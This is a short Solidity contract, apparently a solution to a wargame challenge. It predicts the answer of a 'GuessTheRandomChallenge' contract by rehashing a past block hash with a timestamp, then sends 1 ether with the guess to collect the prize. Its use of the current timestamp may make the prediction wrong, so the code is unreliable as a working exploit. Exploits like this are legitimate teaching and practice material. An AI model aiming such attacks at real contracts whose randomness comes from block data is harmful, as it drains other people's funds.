// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.4.21;

contract AnswerTheChallenge {
    GuessTheRandomChallenge challenge;

    function answerTheChallenge(address challenge_address, uint256 block_number) public payable {
        challenge = GuessTheRandomChallenge(challenge_address);

        require(msg.value == 1 ether);

        uint8 answer = uint8(keccak256(block.blockhash(block_number - 1), now));
        
        challenge.guess.value(msg.value)(answer);
    }

    function() public payable {}
}